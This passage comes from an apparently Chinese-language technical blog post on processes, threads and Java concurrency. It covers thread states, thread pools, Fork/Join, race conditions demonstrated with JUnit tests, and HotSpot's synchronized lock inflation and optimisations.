pattern - Wikipedia\n  Chain of Responsibility Design Pattern in Java\n  High Performance JVM Networking with Netty - Speaker Deck\n  Netty # Wiki # Reference counted objects\n  Principles to Handle Thousands of Connections in Java Using Netty\n  Oracle # Enhancements in Java I/O\n  UNP # Chapter 6. I/O Multiplexing: The select and poll Functions\n  6.2 I/O Models - MASTERRAGHU\n  一文读懂高性能网络编程中的I/O模型\n  select、poll、epoll之间的区别总结[整理]\n  Java Tutorials # Basic I/O\n  Java Tutorials # Custom Networking\n  Vert.x # Guide\n  ","date":"2020-03-08T11:07:41+08:00","permalink":"https://h2cone.github.io/2020/03/08/network_nio/","title":"网络·NIO"},{"content":"进程与线程 现代的计算机系统提供了许多漂亮的抽象，如下图所示：\n其中，进程是对处理器、主存和 I/O 设备的抽象，换言之，进程是操作系统对一个正在运行的程序的一种抽象。操作系统上可以“同时”运行多个进程，已经对一边听歌一边写代码和接收消息的流畅不足为奇，之所以用双引号，因为这可能是一种假象。\n大多数计算机系统中，需要运行的进程数是多于可以运行它们的 CPU 个数的，那么所谓的”同时“运行，很有可能是模拟并发的假象；也就是说一个进程的指令和另一个进程的指令是被 CPU 交错执行的，而且 CPU 在进程间切换足够快，进程“暂停”和“恢复”的间隔也足够短，每个进程看上去像是连续运行。除非有多个 CPU 或多处理器的计算机系统，才能支持多进程并行，即处理器同时执行多个程序的指令。\n一个进程用完了操作系统分配给它的时间片，操作系统决定把控制权转移给新的进程，就会进行上下文切换（context switch），即保存当前进程的状态，恢复目标进程的状态，交接控制权。这种状态被称为上下文（context），比如程序计数器和寄存器的当前值以及主存的内容。\n一个进程可以存在多个控制流（control flow），它们被称为线程。如来自维基百科线程词条的插图所示：\n因为只有单处理器，所以这个进程的两个线程轮番运行在进程的上下文中（模拟并发）。操作系统不仅调度进程，教科书常说，线程是操作系统调度的最小单位。大多数计算机系统中，需要运行的线程数大于可以运行它们的 CPU 核数，从单线程进程推广到多线程进程的线程，一个线程时间到了，上下文切换，它被“暂停”了，轮到了另一个线程运行，稍后轮到它时又“恢复”了。\n多线程程序十分普遍。电脑和手机应用程序在用户界面渲染动画，同时在后台执行计算和网络请求。一个 Web 服务器一次处理数千个客户端的请求。多线程下载、多线程爬虫、多线程遍历文件树\u0026hellip;\u0026hellip;多线程成为越来越重要的模型，因为多线程程序有不少优点。\n多线程之间比多进程之间更容易共享数据和通信。同一个进程的多个线程共享进程的资源，比如进程的虚拟地址空间中的程序代码和程序处理的数据以及文件，对于同一进程的线程们来说，可执行代码只有一套，它们可以访问存储在堆 (Heap) 中的共享变量或全局变量，但是，栈（Stack）、包括程序计数器（Program Counter）在内的寄存器（Register）副本、线程本地存储（Thread Local Storage）都是线程私有的（如果有的话）。不仅如此，线程之间可以通过共享的代码、数据、文件进行通信，绝大部分情况下比进程间的通信更高效。\n多线程执行任务更多或更快。如果主线程阻塞在耗时任务，整个程序可能会卡顿或长时间无响应，解决办法之一便是新建一个工作线程专门执行这个耗时任务，而主线程则继续执行其它任务。例如，前面提到的手机 APP（特别是 Android APP），UI 线程被阻塞后很有可能无法正常人机交互了，用户体验极差。更进一步，单进程的多线程之间的协作有可能提高 client-server 系统的性能，譬如异步调用缩短了请求响应时间（也许总延迟几乎没变）。最重要的是，虽然一个传统的 CPU 只能交错执行一个进程的多个线程，但随着多核处理器和超线程（hyperthreading）的普及，面对多任务或大任务的执行，多线程程序的性能上限具有更高的天花板，因为减少了执行多个任务需要模拟并发的开销，还因为处理器可以并行运行多个线程。\n并发与并行 并发（Concurrency）和并行（Parallelism）这两个术语经常混淆，语义应当结合语境。\n如上图所示，假设有两个任务和两个线程，每个任务只能由一线程执行且用时分别是 t1 和 t2（t1 \u0026lt; t2），且线程都是同时启动，那么各个方式总执行时间可能如下表所示：\n   方式 总执行时间     串行 t1 + t2   并行 t2   单处理器并发 t1 + t2 + 上下文切换总时间    由此可见，如果上下文切换的耗时可以忽略不计，单处理器并发不仅执行总时间近似于串行执行总时间，还有一个优点是同时执行两个任务的假象。并行的方式非常快，但也取决于最耗时的任务。\n在多处理器计算机系统中，多线程交错执行或并行执行都有可能出现，下文将”交错或并行“统称为”并发“。\nJava 多线程 Java 进程 任何 Java 应用程序都跑在操作系统之上，操作系统作为硬件和应用程序的中间层，隐藏了下层具体实现的复杂性，并给上层提供了简单或统一的接口。\n正在运行的 Java 程序就是 Java 虚拟机（JVM），而虚拟机是对整个操作系统的抽象，但对操作系统来说 JVM 仍然是进程。下面这张来自 JVM Internals 的图展示了 Java SE 7 虚拟机运行时的数据区域（Run-Time Data Areas）。图中的堆和栈类似于 Linux/Unix 操作系统进程的虚拟地址空间中的堆和栈，值得注意的是 Java 8 用元空间（Metaspace）代替了永久代（PermGen）。JVM 运行时的数据区域可分成两大类，一是 Java 线程共享区域，包括堆和方法区；二是 Java 线程私有区域，包括栈，详情请见 The Java Virtual Machine Specification, Java SE 8 Edition # 2.5. Run-Time Data Areas。\nJava SE 最常用的虚拟机是 Oracle/Sun 研发的 Java HotSpot VM。HotSpot 基本的线程模型是 Java 线程与原生线程（native thread）之间 1:1 的映射。线程通常在操作系统层实现或在应用程序层实现，前者的线程称为内核线程，后者的线程可能称为用户线程。内核（kernel）是操作系统代码常驻主存的部分，而所谓用户，就是应用程序和应用程序开发者。\n前文提到，充分利用多处理器能使多线程程序运行得更快。在操作系统层，消费多处理器的是内核线程，操作系统负责调度所有内核线程（原生线程）并派遣到任何可用的 CPU，因为 Java 线程与内核线程（原生线程）是一对一映射，所以充分利用多处理器能增强 Java 程序的性能。\n启动线程 对于 HotSpot VM 来说，Java 线程是 java.lang.Thread 的实例。Java 用户可以使用类继承 java.lang.Thread 来新建和启动 Java 线程：\n1 2 3 4 5 6 7 8 9 10 11  public class HelloThread extends Thread { @Override public void run() { System.out.println(\u0026#34;Hello from a thread\u0026#34;); } public static void main(String[] args) { new HelloThread().start(); } }   或者使用类实现 java.lang.Runnable 来新建和启动线程。\n1 2 3 4 5 6 7 8 9 10 11  public class HelloRunnable implements Runnable { @Override public void run() { System.out.println(\u0026#34;Hello from a thread\u0026#34;); } public static void main(String[] args) { new Thread(new HelloRunnable()).start(); } }   Java 8 以上的用户也许更倾向于使用匿名内部类实现 java.lang.Runnable 或 Lambda 表达式简化以上代码，但都是通过调用 java.lang.Thread#start 方法来启动新线程，对应的原生线程（内核线程）在启动 Java 线程时创建，并在终止时回收。其中，run 方法是 Java 线程启动后执行的语句组，即人类要求它执行的任务，而 main 方法的语句是 Java 用户直接或间接通过命令行启动 JVM 后执行。\n如上图所示，即使运行一个简单的 \u0026ldquo;Hello World\u0026rdquo; 程序，也可能在 JVM 或操作系统创建十几个或更多线程。例如执行 main 方法的语句需要的主线程，主线程能启动子线程并执行后续语句，子线程也能启动其子线程并执行后续语句，而且还有其它由 HotSpot 为了内部目的而创建的线程，如 VM thread、Periodic task thread、GC threads、Compiler threads、Signal dispatcher thread。\n主线程终止，其它线程还会运行吗？\nThreadLocal 前面提到了线程有若干的私有区域，其中之一能在 java.lang.Thread 中找到数据结构。Thread 维护了一个类型为 java.lang.ThreadLocal.ThreadLocalMap 的字段，ThreadLocalMap 是一个定制化的 HashMap，key 的类型是 ThreadLocal，value 指代线程本地变量的值。\n1 2 3 4 5 6 7 8 9 10 11  public class TransactionId { private static final ThreadLocal\u0026lt;Long\u0026gt; tid = ThreadLocal.withInitial(() -\u0026gt; 0L); public static Long get() { return tid.get(); } public static void set(Long value) { tid.set(value); } }   如上所示，类型为 ThreadLocal 的字段初始化后，每个访问该字段（通过 get 或 set 方法）的线程访问的是各自 ThreadLocalMap 实例存储的 key/value，其中类型是 ThreadLocal 的 key 相等，但 value 不一定相等。\n线程状态 下面这个来自 Java 6 Thread States and Life Cycle 的状态机，很好地描述了 Java 线程状态和生命周期。\n翻阅 JDK 8 的 java.lang.Thread.State 可以确定，在给定的时间点，一个 Java 线程只能处于以下状态之一：\n  New。尚未启动的线程处于此状态。\n  Runnable。Java 虚拟机中正在执行的线程处于此状态。\n  Blocked。等待获得监视器锁（monitor lock）而被阻塞的线程处于此状态。\n  Waitting。无限期地等待另一个线程执行特定操作的线程处于此状态。\n  Timed Waiting。有限期地等待另一个线程执行特定操作的线程处于此状态。\n  Terminated。终止的线程处于此状态。\n  如状态机所示，当线程执行不同操作时，线程状态发生转换，这些操作对应于 JDK 已提供的方法。注意上图的 o 表示 Object，t 表示 Thread。\n通知 wait/notify 一个线程处于等待状态时，可以被另外一个线程通知，转为可运行状态。比如，一个线程用一个对象（的引用）调用 Object#wait()，另一个线程用同一个对象（的引用）调用 Object#notify() 或 Object#notifyAll()，前提是它们必须拥有该对象的内置锁；第一个线程调用 Object#wait() 时，它会释放该对象的内置锁并“暂停”，第二个线程获得该对象的内置锁成功之后，调用 Object#notifyAll() 通知所有曾经用同一个对象（的引用）调用了 Object#wait() 的线程有重要事情发生；在第二个线程释放了该对象的内置锁后的某个时刻，第一个线程重新获得了该对象的内置锁，并从 Object#wait() 返回而“恢复”。阻塞状态与内置锁或监视器锁息息相关，将在下文的\u0026quot;锁和同步\u0026quot;讨论。\n详情请见 Object。\ninterrupt 另外，线程有一个中断状态（interrupt status）。所谓中断，即停止正在执行的操作，并执行其它操作。例如，主线程可使用子线程对象（的引用）调用 java.lang.Thread#interrupt() 中断子线程，子线程能够捕获 java.lang.InterruptedException 或调用 java.lang.Thread#interrupted() 接收到中断。\n详情请见 Thread。\npark/unpark 类比申请许可和提供许可。相比于 wait/notify，park/unpark 对调用顺序没有要求。线程调用 LockSupport#park() 时“暂停”，线程调用 LockSupport#unpark(Thread) 时取消给定线程的“暂停”，如果给定线程已“暂停”，则给定线程从 LockSupport#park() 返回而“恢复”，如果给定线程没有“暂停”，那么将来给定线程第一次调用 LockSupport#park() 时立即返回。\n详情请见 LockSupport。\nspurious wakeup 中断和虚假唤醒可能发生，官方建议在循环体内使用 wait 和 park，如下所示：\n1 2 3 4 5  synchronized (obj) { while (\u0026lt;condition does not hold\u0026gt;) obj.wait(); ... // Perform action appropriate to condition }   1 2 3 4 5  while (waiters.peek() != current || !locked.compareAndSet(false, true)) { LockSupport.park(this); if (Thread.interrupted()) // ignore interrupts while waiting  wasInterrupted = true; }   线程池 使用 Thread.start(...) 启动线程足以执行基本的任务，但是对于复杂任务，例如有返回值的任务和定时任务等，其 API 过于低级。大规模的应用程序中，将线程的创建和管理从应用程序其余部分分开是很有意义的，理由之一是分离关注点能够减弱复杂性。封装了线程的创建和管理的对象们称为 Executors。JDK 的 java.util.concurrent 包定义了三代 Executor 接口：\n  Executor\n  ExecutorService\n  ScheduledExecutorService\n  如果 r 是 Runnable 对象，而 e 是 Executor 对象，则可以使用\n1  e.execute(r);   代替\n1  new Thread(r).start();   Executor 接口大部分实现都使用线程池（Thread Pool），这就是理由之二。例如，一个一般的服务器端程序服务着多个客户端，如果每个客户端的请求都通过新建一个线程来处理，即线程数随着请求数增加而增加，虽然新建线程比新建进程便宜，但是当活跃的线程数太多时，不仅占用大量的内存，容易导致内存溢出，而且操作系统内核需要花费大量的时间在线程调度上（上下文切换），大量的线程“暂停”较长时间，还因频繁新建和终结执行短时任务的线程而引起的延迟，大量客户端长时间得不到响应。\n对于 Java Hotspot VM 来说，大量线程的另一个问题是巨大的根集合（root set），因此 GC 停顿阶段（stop-the-world pause）更长。\n线程池由数量可控的工作线程（worker thread） 组成，每个工作线程的生命都被延长，以便用于执行多个任务，既减少了上下文切换引起的延迟，也减少了频繁新建和终结执行短暂任务的线程而引起的延迟。线程池的新建通常是预处理，即服务器端程序提供服务之前已准备好线程池，避免了临时新建大量线程的开销。\n线程池有一种类型是固定线程池（fixed thread pool），如果某个线程仍在使用中而被某种方式终止，那么就会有新的线程代替它。任务通过队列提交到池中，任务队列可以容纳超过线程池中线程数量的的任务。这样设计的好处是优雅降级（degrade gracefully）和削峰。\n1 2 3  public static ExecutorService newFixedThreadPool(int nThreads) { return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue\u0026lt;Runnable\u0026gt;()); }   上面是 Executors 的新建固定线程池的简单方法。注意当中的参数类型，LinkedBlockingQueue，它是 BlockingQueue 的基于链表的实现类，作为阻塞队列，它有一个特性，当队列为空时，线程从队列拉取元素会被阻塞或被迫等待。仔细翻阅源码，可以知道线程池的预先新建和工作线程的生命延长是通过阻塞工作线程或使之有限期等待来实现。除此之外，任务队列的的任务抽象为 Runable。\n新建线程池返回一个 ExecutorService 实例，利用它来提交任务：\n1 2 3  Future\u0026lt;?\u0026gt; future = executorService.submit(() -\u0026gt; { // do something });   submit 方法可传递 Runable 引用或 Callable 引用，两者的关系如下：\n1  Runnable runnable = new FutureTask\u0026lt;\u0026gt;(callable);   Future 表示异步结果。主线程调用 Future#get 方法时被迫等待，直到子线程完成相应的任务后，主线程从 Future#get 方法返回得到结果并执行后续语句。\nCompletableFuture 实现了 Future，并且支持设置回调方法。主线程无需等待工作线程完成相应的任务，当工作线程完成相应的任务后，回调方法会被调用。\n1 2 3 4 5 6 7 8 9 10 11  CompletableFuture\u0026lt;Object\u0026gt; future = CompletableFuture.supplyAsync(() -\u0026gt; { // do something }, threadPoolExecutor); future.thenCompose(obj -\u0026gt; CompletableFuture.supplyAsync(() -\u0026gt; { // do other things }), threadPoolExecutor); future.whenComplete((obj, e) -\u0026gt; { // callback }, threadPoolExecutor);   设想一下多线程并发处理事件，要求主线程等待所有任务完成。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  List\u0026lt;CompletableFuture\u0026lt;Event\u0026gt;\u0026gt; futures = new ArrayList\u0026lt;\u0026gt;(events.size()); for (Event event : events) { CompletableFuture\u0026lt;Event\u0026gt; future = CompletableFuture.supplyAsync(() -\u0026gt; { // handle event  return event; }, threadPoolExecutor); futures.add(future); } CompletableFuture\u0026lt;Void\u0026gt; allFuture = CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])); try { allFuture.join(); } catch (Exception e) { // ... }   使用 Executors 新建线程池，需要注意的是，可能会因为任务队列堆积过多任务从而导致内存溢出，因为 LinkedBlockingQueue 可自动扩容，最大值为 Integer.MAX_VALUE。建议合理设置线程池的各个参数，例如使用构造器新建线程池：\n1  new ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue\u0026lt;Runnable\u0026gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler);   提交任务后，可能的情况如下所示：\n详情见 ThreadPoolExecutor 和 ScheduledThreadPoolExecutor。\nFork/Join Fork/Join 框架是 ExecutorService 接口的实现，它是为了可以分而治之的任务或工作而设计的，目标是使用所有可用的处理器来提高应用程序的性能。Fork/Join 框架分配任务给线程池中的工作线程，但是与一般的线程池不一样，它使用工作窃取算法，空闲的工作线程可以窃取繁忙的工作线程的任务来执行，这个线程池称为 ForkJoinPool。\n工作线程很有可能会被 BOSS 命令按以下套路工作：\n1 2 3 4 5  if 我的工作量足够小 直接做工作 else 将我的工作分为两个片段 调用两个片段并等待结果   分而治之，通常把一个足够大的工作任务递归分解为两个或多个相同或相似的子任务。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  public class BigTask extends RecursiveAction { private long[] src; private int start, len; // ...  public BigTask(long[] src, int start, int len) { this.src = src; this.start = start; this.len = len; } protected static int threshold = 1000; @Override protected void compute() { if (len \u0026lt; threshold) { // 直接操作 src  } else { int split = len / 2; invokeAll(new BigTask(src, start, split), new BigTask(src, start + split, len - split)); // ...  } } }   假设这个大任务（BigTask）是对一个很长的数组（src）进行某些操作，例如排序、map、reduce、过滤、分组等。其中 BigTask 继承了 RecursiveAction，重写了 compute 方法。然后，新建一个线程池，命令工作线程执行大任务。\n1 2 3 4 5  long[] src = ...; BigTask task = new BigTask(src, 0, src.length); ForkJoinPool pool = new ForkJoinPool(); pool.invoke(task);   一个工作线程调用了 compute 方法，先判断当前 src 的长度是否小于阈值（threshold），若是则认为这个任务足够小，单线程很快就能完成对 src 的操作，否者就认为这个任务足够大，需要分工，于是先把 src 分成两个片段，然后调用 invokeAll 方法，其它工作线程去执行这两个子任务，又调用了 compute 方法\u0026hellip;\u0026hellip;在多处理器计算机系统中，因为支持多线程并行，所以这类程序通常运行得很快。\n如果需要返回值，则可以使用 RecursiveTask。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  public class FibonacciTask extends RecursiveTask\u0026lt;Integer\u0026gt; { private int n; public FibonacciTask(int n) { this.n = n; } @Override protected Integer compute() { if (n \u0026lt;= 1) { return n; } FibonacciTask f1 = new FibonacciTask(n - 1); f1.fork(); FibonacciTask f2 = new FibonacciTask(n - 2); return f2.compute() + f1.join(); } public static void main(String[] args) throws ExecutionException, InterruptedException { ForkJoinPool pool = new ForkJoinPool (Runtime.getRuntime().availableProcessors(), ForkJoinPool.defaultForkJoinWorkerThreadFactory, null, true); ForkJoinTask\u0026lt;Integer\u0026gt; task = pool.submit(new FibonacciTask(10)); Integer result = task.get(); } }   先分解，后合并。\nJDK 的 java.util.Arrays 和 java.util.streams 提供了许多操作聚合类型实例的并行化方法，这些方法通常基于 Fork/Join。\n非线程安全 前面说到了多线程程序的优点，但它也有明显的缺点。因为多个线程并发执行，且多个线程共享同一份只读代码，当多个线程并发读写共享变量或全局变量时，可能出现线程干扰（thread interference）和内存一致性错误（memory consistency errors），从而无法保证程序功能正确，也称为线程不安全。\n1 2 3 4 5 6 7 8 9 10 11  public class Counter { private long count; public void increment() { count++; } public long value() { return count; } }   上面是一个简单的计数器（Counter），其中有一个将计数器的值（count）增加 1 的方法（increment）。从人脑的角度，increment 方法可分解为三个步骤：\n 读取 count 的值。 计算 count + 1。 把计算结果写回 count。  从计算机处理器的角度：\n 从主存复制 count 的值和 1 的值到两个寄存器，以覆盖寄存器原来的值。 把两个寄存器的值复制到 ALU，ALU 对这两个值做算术运算。 ALU 将运算结果存入一个寄存器，以覆盖该寄存器原来的值。  假设两个线程读取了 count 的值为 0，两个线程都在计算 0 + 1，一个线程比另一个线程更快把计算结果写回 count，此时 count 的值为 1，较慢的线程把 1 写回了 count，最终 count 的值是错误的 1，而不是正确的 2。在转账场景下，相互覆盖或丢失修改是一个非常严重的错误，例如两个人同时对一个银行账户进行取款或存款，如果银行软件系统开发者仍然有线程惯性，那么结果可能取多了金额或存少了金额。\n   线程 1 线程 2  整数值        0   读取  \u0026lt;- 0    读取 \u0026lt;- 0   增加   0    增加  0   写回  -\u0026gt; 1    写回 -\u0026gt; 1    下面通过 Junit 测试，来证实线程不安全的存在。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  public class CounterTest { private static final long wait = 3000; private final long threads = 2; private final long times = 1000000; private final long excepted = threads * times; @Test public void testIncrement() throws InterruptedException { Counter counter = new Counter(); startThreads(counter, () -\u0026gt; { for (int j = 0; j \u0026lt; times; j++) { counter.increment(); } System.out.printf(\u0026#34;threadName: %s, counterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), counter.value()); }); Assert.assertNotEquals(excepted, counter.value()); } private void startThreads(Counter counter, Runnable runnable) throws InterruptedException { for (int i = 0; i \u0026lt; threads; i++) { new Thread(runnable).start(); } Thread.sleep(CounterTest.wait); System.out.printf(\u0026#34;threadName: %s, exceptedCounterValue: %s, actualCounterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), excepted, counter.value()); } }   一个临时测试线程调用了 testIncrement 方法，启动了 2 个子线程，为了避免其中一个线程已经停止了，而另外一线程启动中，模拟了一个耗时任务，两个线程都要重复调用 Counter 的 increment 方法 1000000 次。注意，临时测试线程跳出循环后，会睡眠 3000 毫秒，才继续往下执行，预期结果为 2000000（子线程数与递增次数的乘积）。此处省略本机信息，测试结果如下：\n临时测试线程和两个子线程取得 count 的值都是错误的。根本原因是多线程并发访问共享变量或全局变量时，每个线程对该变量赋值前的值与它读取的值不一致，最终导致了程序错误。结合上面提到的 JVM 运行时的数据区域，可以推断出 Java 各种变量是否线程安全。\n   变量 区域 是否线程共享 是否线程安全     实例字段（instance field） 堆 是 否   静态字段（static field） 堆 是 否   本地变量（local variable） 栈 否 是    Java 并发编程 锁 保证多线程并发访问共享资源的程序正确，有一个直观的解决方案——锁（Lock）。\n  只有获得锁成功的线程才能进入临界区（critical section），访问共享资源。\n  访问共享资源完成后，即使过程发生异常，也一定要释放锁，退出临界区。\n  软件层的锁通常需要硬件层支持才能有效实现。这种支持通常采取一种或多种原子指令的形式，如 test-and-set、compare-and-swap、fetch-and-add。所谓原子指令，即处理器执行该指令不可分割且不可中断，换言之，原子操作要么完全发生，要么根本不发生。对于多处理器的计算机系统，为了保证原子性，甚至可能通过锁定总线，暂时禁止其它 CPU 与内存通信。\nsynchronized 以前文的计数器为例，新增一个用 synchronized 修饰的 incrementSyncMethod 方法到 Counter，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  public class Counter { private long count; public void increment() { count++; } public synchronized void incrementSyncMethod() { count++; } public long value() { return count; } }   使用与测试 increment 方法相同的测试数据，测试启动相同个数的子线程重复调用同一个 Counter 对象的 incrementSyncMethod 方法相同次数，测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12  @Test public void testIncrementSyncMethod() throws InterruptedException { Counter counter = new Counter(); startThreads(counter, () -\u0026gt; { for (int j = 0; j \u0026lt; times; j++) { counter.incrementSyncMethod(); } System.out.printf(\u0026#34;threadName: %s, counterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), counter.value()); }); Assert.assertEquals(excepted, counter.value()); }   测试结果如下图所示：\n测试通过，期望值（exceptedCounterValue）与实际值（exceptedCounterValue）相等，其中一个子线程（Thread-1）与临时测试线程（Time-limited test）读取的 count 值相等。\n防止线程干扰和内存一致性错误的机制是同步（Synchronization）。关键字 synchronized，翻译为已同步。当只有一个线程调用一个同步方法，它会隐式获得该方法的对象的内置锁（intrinsic lock）或监视器锁（monitor lock），并在该方法返回时隐式释放该对象的内置锁（即使返回是由未捕获异常引起的）。如果是用 synchronized 修饰的静态方法，这个线程会获得该静态方法所属的类所关联的 Class 对象的内置锁，因此，通过不同于该类的任何实例的锁来控制对该类的静态字段的访问。\n这足以解释上面的两个线程读写同一个变量重复百万次，最后结果仍然正确的原因。两个线程调用同一个同步方法，一个线程快于另一个线程获得了这个方法的对象的内置锁，较慢的线程则被迫等待或被阻塞，已拥有该对象的内置锁的线程执行该方法的语句，修改共享实例字段，该方法返回时隐式释放了该对象的内置锁，另一个线程有机会拥有该对象的内置锁\u0026hellip;\u0026hellip;即使重复多次，一个时刻只能有一个线程正在访问共享实例字段，另一个线程被迫等待或被阻塞，也就是说这个两个线程对于共享实例字段的访问是互斥的，也就不会出现线程干扰和内存一致性错误。\n   线程 1 线程 2  整数值        0   获得锁（成功）   0    获得锁（失败）  0   读取  \u0026lt;- 0   增加   0   写回  -\u0026gt; 1   释放锁   1    获得锁（成功）  1    读取 \u0026lt;- 1    增加  1    写回 -\u0026gt; 2    释放锁  2    编写同步代码的另一个方式是使用同步语句（Synchronized Statements），比如，改写一下测试方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  @Test public void testIncrementSyncBlock() throws InterruptedException { Counter counter = new Counter(); startThreads(counter, () -\u0026gt; { for (int j = 0; j \u0026lt; times; j++) { synchronized (counter) { counter.increment(); } } System.out.printf(\u0026#34;threadName: %s, counterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), counter.value()); }); Assert.assertEquals(excepted, counter.value()); }   或者添加一个 incrementSyncStmt 方法到 Counter 类，以及新增对应的测试用例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  public class Counter { private long count; public void increment() { count++; } public synchronized void incrementSyncMethod() { count++; } public void incrementSyncStmt() { synchronized (this) { count++; } } public long value() { return count; } }   1 2 3 4 5 6 7 8 9 10 11 12  @Test public void testIncrementSyncStmt() throws InterruptedException { Counter counter = new Counter(); startThreads(counter, () -\u0026gt; { for (int j = 0; j \u0026lt; times; j++) { counter.incrementSyncStmt(); } System.out.printf(\u0026#34;threadName: %s, counterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), counter.value()); }); Assert.assertEquals(excepted, counter.value()); }   采用同步语句需要显式指定一个提供内置锁的对象，同步语句建立临界区，多线程互斥访问该对象的状态（实例字段或静态字段）。\n膨胀 每一个 Java 对象都有一个与之关联的内置锁或监视器锁，其内部实体简称为监视器（monitor），又称为管程。因为有关键字 synchronized，所以每个 Java 对象都是一个潜在的监视器。一个线程可以锁定或解锁监视器，并且在任何时候只能有一个线程拥有该监视器。只有获得了监视器的所有权后，线程才可以进入受监视器保护的临界区。这与上文对内置锁的讨论一致，获得锁和释放锁可对应于 JVM 指令集的 monitorenter 和 monitorexit，即线程进入监视器和退出监视器。\n如果对 Counter.class 进行反汇编：\n1  javap -v target/classes/io/h2cone/concurrent/Counter.class   那么可以看到同步方法和同步语句的可视化字节码。\n同步方法虽然使用一个名为 ACC_SYNCHRONIZED 的 flag，但从 Java 虚拟机规范可以知道，底层行为也应该是进入监视器和退出监视器。\n在 Java Hostspot VM 中，每一个 Java 对象的内存布局都有一个通用的对象头（object header）～结构。对象头的第一个字是 mark word，第二字是 klass pointer。\n  mark word。通常存储同步状态（synchronization state）和对象的 hash code。在 GC 期间，可能包含 GC 状态。\n  klass pointer。指向另一个对象（元对象），该对象描述了原始对象的布局和行为。\n  普通对象头一般有 2 个字（word），数组对象头一般有 3 个字（word）。\n  锁的信息被编码在在对象头的 mark word，Mark word 最低两位的值（Tag）包含了对象的同步状态：\n 未锁定/已解锁（Unlocked）。没有线程拥有该对象的锁。 轻量级已锁定（Light-weight locked）。某个线程拥有该对象的轻量级锁。 重量级已锁定（Heavy-weight locked）。某个线程拥有该对象的重量级锁。 有偏向/可偏向（Biased / Biasable）。该对象已偏向或可偏向于某线程。  下图描述了对象同步状态的转换，也是锁状态的转换。\n如果一个类的“可偏向”被禁用，该类的实例或对象的同步状态始于未锁定，即右手边。\n  当一个线程调用该对象的同步方法或执行了指定该对象的同步语句，Mark word 副本和指向对象的指针存储在该线程当前栈帧（frame）内的锁记录（lock record）中。\n  JVM 尝试通过 compare-and-swap（CAS）在该对象的 mark word 中安装一个指向锁记录的指针（pointer to lock record）。\n  如果 CAS 操作成功，则该线程拥有了该对象的锁。该对象的 mark word 最后两位的值是 00。该锁称为轻量级锁。\n 如果是递归或嵌套调用作用于该对象的同步代码，锁记录初始化为 0，而不是该对象的 mark word。    如果 CAS 操作失败，则说明该对象已被其它线程锁定成功。JVM 首先检测该对象的 mark word 是否指向当前线程的栈。\n    当多个线程并发锁定同一个对象，且竞争足够激烈时，轻量级锁升为重量级锁。重量级锁就是监视器，监视器管理等待的线程。等待获得监视器的线程状态就是“线程状态”所说的阻塞。\n    JVM 使用的监视器类型可能如上图所示，该监视器由三个房间组成。中间只有一个线程，即监视器所有者。在左侧，一个小房间包含了入口集（entry set）。在右侧，另一个小房间包含了等待集合（wait set）。那么如果此 Java 监视器未过时，被阻塞的线程更可能处于入口集，因为等待集中的线程状态是“线程状态”所说的等待。\n  轻量级锁比重量级锁便宜很多，因为避免了操作系统互斥锁/条件变量（mutex / condition variables）与每个对象的联动。\n  如果有多个线程并发锁定共享对象，获得轻量级锁失败的线程通常不会被阻塞或被迫等待，而是自旋若干次，尝试获得锁。HotSpot VM 使用高级自适应自旋技术（advanced adaptive spinning techniques）来提高程序吞吐量，即使是锁定共享对象竞争激烈的程序。\n  如果一个类的“可偏向”已启用，该类的实例或对象的同步状态始于未锁定，且无偏向，即左手边。\n  据说，获得轻量锁的 CAS 在多处理器计算机系统上可能引起较大延迟，也许大多数对象在其生命周期中最多只能被一个线程锁定。早在 Java 6，此问题试图通过偏向锁优化。\n  该对象被第一个线程锁定时，只执行一次 CAS 操作，以将该线程 ID 记录到该对象的 mark word 中。于是该对象偏向于该线程。将来该线程对该对象的锁定和解锁无需任何原子操作或 mark word 的更新，甚至该线程栈中的锁记录也不会初始化。\n  当一个线程锁定已偏向于另一个线程的对象，该对象的偏向会被撤销（此操作必须暂停所有线程）。一般由偏向锁转为轻量级锁。\n  偏向锁的设计对一个线程重新获得锁更便宜和另一个线程获得锁更昂贵做了权衡：\n  如果某个类的实例在过去频繁发生便偏向撤销，则该类将禁用“可偏向”。这个机制叫做批量撤销（bulk revocation）。\n  如果一个类的实例被不同的线程锁定和解锁，且不是并发，则该类的实例被重置为已解锁且无偏向，但仍是可偏向的对象，因为该类的“可偏向”不会被禁用。这个机制叫做批量重置偏向（bulk rebiasing）。\n    当然可以从一开始就禁用偏向锁，启动 HotSpot VM 时指定关闭 UseBiasedLocking：\n  1  -XX:-UseBiasedLocking   对于一些程序，偏向锁弊大于利，例如 Cassandra 就禁用了它。\n简而言之，从 Java 6 开始就对 synchronized 做了不少优化，随着多线程锁定共享对象的竞争强度增大，锁的状态一般由偏向锁升为轻量级锁，竞争足够激烈时，则升为重量级锁，这个过程称为膨胀（inflate）。\n消除 在某些情况下，JVM 可以应用其它优化。例如，StringBuffer，它有很多同步方法。\n1 2 3 4 5 6 7  { StringBuffer sb = new StringBuffer(); sb.append(\u0026#34;foo\u0026#34;); sb.append(v); sb.append(\u0026#34;bar\u0026#34;); return sb.toString(); }   如上所示，语句在某方法体内，因为 sb 是本地变量，所以调用 append 方法可以省略锁，这叫做锁消除（lock elision）。\n粗化 1 2 3 4 5  { sb.append(\u0026#34;foo\u0026#34;); sb.append(v); sb.append(\u0026#34;bar\u0026#34;); }   再如上所示，如果 sb 是全局变量，且第一次 append 方法调用时已被某线程锁定成功，该线程可以避免 3 次锁定/解锁操作，而只需 1 次，这叫做锁粗化（lock coarsening）。\n死锁 